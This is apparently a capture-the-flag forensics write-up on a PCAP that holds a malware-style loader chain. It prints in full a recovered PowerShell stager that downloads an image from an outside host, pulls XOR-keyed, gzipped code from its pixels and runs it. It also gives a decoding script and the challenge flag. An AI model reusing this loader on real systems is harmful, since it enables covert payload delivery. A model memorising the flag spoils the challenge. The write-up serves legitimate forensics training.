# Invisible
---
## Challenge Information
- **Category:** Forensics
- **Difficulty:** Easy
- **Points:** 75
- **Artifact:** `capture.pcap`
- **Flag Format:** `VBD{...}`
- **Flag:** `VBD{8059d662ede0cdd27c0d218c2943248f}`

---

## TL;DR
The PCAP delivers a Node.js dropper that saves an obfuscated batch file. That batch file expands into a PowerShell stager which downloads `payload.png`, reads a 4-byte length from the first two pixels, extracts exactly 532 RGB bytes starting from pixel index `2`, XORs them with `91d2f87dab32f433`, GZip-decompresses the result, and executes stage-2. Stage-2 contains the flag directly:

`VBD{8059d662ede0cdd27c0d218c2943248f}`

---

## 1. Initial Triage
The only provided artifact was:

```text
capture.pcap
```

Exporting HTTP objects revealed several images plus two scripts of interest:

- `init.js`
- `packageloader.bat`
- `payload.png`

`init.js` is straightforward. It downloads the batch file from Codeberg and places it in the Windows Startup folder:

```javascript
const telemetryEndpoint =
  'https://codeberg.org/maldev/loader/raw/branch/main/packageloader.bat';
```

So the real solve path is in `packageloader.bat` and whatever it does with `payload.png`.

---

## 2. Reconstructing the Batch Loader
`packageloader.bat` is heavily padded with junk `%...%` insertions and thousands of `set VAR=value` assignments. The `:PAYLOAD` section launches PowerShell using a very long string composed from `%VAR%` expansions.

The key step is:

1. Remove junk `%...%` insertions from the `set` lines.
2. Build a variable dictionary from the recovered assignments.
3. Expand the raw `powershell.exe -c "%VAR%%VAR%..."` payload line.

After expansion, the relevant stage-1 PowerShell is:

```powershell
$wc=New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$imgData=$wc.DownloadData('https://i.ibb.co/0zt4quciwxs2/payload.png')
$ms=New-Object IO.MemoryStream(,$imgData)
Add-Type -AssemblyName System.Drawing
$bmp=[Drawing.Bitmap]::FromStream($ms)
$sz=($bmp.GetPixel(0,0).R -shl 24) -bor ($bmp.GetPixel(0,0).G -shl 16) -bor ($bmp.GetPixel(0,0).B -shl 8) -bor $bmp.GetPixel(1,0).R
$buf=New-Object byte[] $sz
$idx=0
$pi=2
while($idx -lt $sz){
  $x=$pi%$bmp.Width
  $y=[math]::Floor($pi/$bmp.Width)
  $px=$bmp.GetPixel($x,$y)
  if($idx -lt $sz){$buf[$idx]=$px.R;$idx++}
  if($idx -lt $sz){$buf[$idx]=$px.G;$idx++}
  if($idx -lt $sz){$buf[$idx]=$px.B;$idx++}
  $pi++
}
$k=[Text.Encoding]::UTF8.GetBytes('91d2f87dab32f433')
for($j=0;$j -lt $buf.Length;$j++){
  $buf[$j]=$buf[$j] -bxor $k[$j%$k.Length]
}
$ms2=New-Object IO.MemoryStream(,$buf)
$gz=New-Object IO.Compression.GZipStream($ms2,[IO.Compression.CompressionMode]::Decompress)
$sr=New-Object IO.StreamReader($gz)
IEX($sr.ReadToEnd())
```

This completely defines the extraction logic.

---

## 3. Understanding `payload.png`
The PNG is `141x141` RGB. The first two pixels are used as metadata.

Observed values:

```text
pixel(0,0) = (0, 0, 2)
pixel(1,0) = (20, 60, 163)
```

The loader computes the payload size as:

```text
sz = (0 << 24) | (0 << 16) | (2 << 8) | 20 = 532
```

So only the first 532 extracted RGB bytes matter. The decoder starts at pixel index `2`, then reads `R`, `G`, `B` from each pixel until the buffer is full.

---

## 4. Reproducing the Decode
Once the real logic is known, the solve is short. This Python script reproduces the PowerShell behavior exactly:

```python
from PIL import Image
import gzip
import re

img = Image.open('payload.png').convert('RGB')
pix = list(img.getdata())

sz = (pix[0][0] << 24) | (pix[0][1] << 16) | (pix[0][2] << 8) | pix[1][0]

buf = bytearray()
pi = 2
while len(buf) < sz:
    px = pix[pi]
    for channel in px:
        if len(buf) < sz:
            buf.append(channel)
    pi += 1

key = b'91d2f87dab32f433'
for i in range(len(buf)):
    buf[i] ^= key[i % len(key)]

stage2 = gzip.decompress(bytes(buf)).decode('utf-8', errors='replace')
print(stage2)

m = re.search(r"VBD\{[^}]+\}", stage2)
print(m.group(0))
```

Output:

```text
VBD{8059d662ede0cdd27c0d218c2943248f}
```

---

## 5. Stage-2 Payload
The decompressed PowerShell contains the flag as a token used in fake C2 traffic:

```powershell
$token='VBD{8059d662ede0cdd27c0d218c2943248f}'
```

The rest of the script is just malware-themed noise:

- creates a mutex
- defines a fake C2 URL
- sends the token in an HTTP header
- polls for remote tasks

For the challenge, the token is the flag.

---

## 6. Final Flag
**`VBD{8059d662ede0cdd27c0d218c2943248f}`**

---

## Lessons Learned
- If a PCAP delivers a loader chain, reconstruct the loader before spending too long on blind stego heuristics.
- Junk `%...%` insertions in batch files are often easier to defeat by rebuilding the final `%VAR%` expansion than by reading the file manually.
- For image-based loaders, the first few pixels often contain metadata such as size, key material, or traversal hints.

